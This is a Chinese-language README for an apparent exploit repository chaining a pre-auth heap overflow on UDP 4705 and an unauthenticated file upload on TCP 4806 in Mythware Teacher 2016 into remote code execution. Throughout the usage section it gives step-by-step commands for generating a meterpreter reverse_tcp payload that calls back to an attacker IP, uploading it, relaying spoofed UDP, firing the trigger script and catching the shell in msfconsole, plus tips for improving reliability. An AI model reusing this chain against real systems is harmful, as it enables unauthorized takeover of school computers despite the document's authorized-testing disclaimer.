# Mythware Teacher 2016 远程 RCE

2026-10 在极域教师端 2016（2.7.0.13488）上测的一套链。两个预认证问题凑在一起：

- UDP 4705 的块接收事务有堆溢出，能把 handler 的 vtable 改成固定的 IAT 地址，最后落到 `WinExec`，命令最多 4 个字符；
- TCP 4806 的媒体服务能预认证上传和读取文件。

所以就是：上传一个短文件名的 EXE，再用 4 字符触发它。脚本全是 Python，没放 Ruby 模块，也没放 C/EXE。

> 只在自己的实验环境或者有明确授权的目标上用。会启动进程，上传后教师端还可能直接崩，别在生产环境试。

我这边环境：

- 教师端 2.7.0.13488，登录后 UDP 4705 才会绑上；
- 教师端绑在 `172.27.144.1`，攻击机在 `10.16.74.105`；
- 普通 UDP 发到 `172.27.144.1` 教师端收不到（它的块接收在 L2），所以用 `udp_relay.py` 中转；能直连的 LAN 可以不用。

## 用法

**1. 生成 payload**

文件名主干必须是 1-4 个 ASCII 字符，这是触发包 `+4` 的版本字段 NUL 卡出来的限制。

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.16.74.105 LPORT=4444 \
  -f exe -o rce.exe

# 或者用仓库里的包装脚本
python tools/make_payload.py --lhost 10.16.74.105 --lport 4444 --name rce
```

**2. 上传**

目标目录得可写，而且在 WinExec 的搜索路径里（教师 CWD、应用目录、PATH）。我这边是 `F:\Program\Mythware`。

```bash
python exploit/media_upload.py rce.exe "F:\Program\Mythware\rce.exe" --delay-ms 30
```

上传完教师端可能几秒内就崩，文件一般已经落盘了。要么马上触发，要么重启登录后只跑第 4 步。

**3. 教师端绑虚拟网卡时，在教师主机起中继**

管理员 + Npcap：

```bash
python exploit/udp_relay.py \
  --listen-ip 10.16.74.105 --listen-port 4705 \
  --target 172.27.144.1 --target-port 4705 \
  --spoof-src 172.27.144.200 \
  --allow 10.16.64.0/18
```

直连场景跳过这步。

**4. 触发**

```bash
python exploit/remote_batch_rce.py \
  --target 172.27.144.1 --send-ip 10.16.74.105 \
  --port 4705 --count 150 --command4 rce --no-verify
```

本机调试可以用 `--transport npcap`（管理员 + Npcap），或者传 PID 做本机命中检测。

**5. 收 session**

```text
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.16.74.105
set LPORT 4444
run
```

## 几个坑

- 块接收不是普通 UDP socket。同机发到 `172.27.144.1`，`sendto` 返回成功，教师端根本不建事务；要么中继，要么 Npcap 伪装源 IP。
- 上传完成/关闭的响应路径会崩，RST 只是把崩延后。17KB 左右 5ms 够，大一点我一般 30ms 起。
- 上传不截断同名文件，尾部会留旧内容，换新名字。
- 4 字符限制来自触发包 `+4` 的 `0x00010000`，不是服务端另加的长度检查。
- 命中靠堆布局，`H-B=0x58` 的事务不是每次都有。150 起步，不行 200/300，或者重启教师端再试；成功一次后基本要重启。
- 4 字符 stager 的任意命令执行要额外的 stager EXE，仓库里没放；`cmd_relay.py`/`send_cmd.py` 是给已经有 stager 的场景用的。
- 上传到 Program Files 可能被 UAC 虚拟化到 VirtualStore，那里不在搜索路径；用教师 CWD 或可写 PATH，或者让教师以管理员跑。

## 文件

- `exploit/remote_batch_rce.py` — 块事务 + V-fill + 触发
- `exploit/media_upload.py` — 4806 上传
- `exploit/media_read.py` — 4806 任意读
- `exploit/mythware_poc.py` — 组包
- `exploit/npcap_inject_poc.py` — Npcap 注入
- `exploit/udp_relay.py` — 教师主机 UDP→L2
- `exploit/cmd_relay.py`、`exploit/send_cmd.py` — 可选，给 4 字符 stager 用
- `tools/make_payload.py` — msfvenom 包装
- `tests/test_packets.py` — 报文布局检查
- `docs/` — 漏洞和协议笔记，`analysis.md` 是当时写的完整分析

## 还没搞定

- 纯 Python 的 4 字符 stager 没有，仓库里只有 Python 利用端；payload 用 msfvenom 生成。
- 成功率没统计，堆布局看运气。
- 2021 版不适用：端口、虚表都不一样。

## 参考

- `docs/analysis.md` — 当时的静态分析和调试记录
- `docs/vulnerability.md` — 漏洞讲解（短版）
- `docs/protocol.md` — 报文格式备忘

## License

MIT。仅用于授权测试。
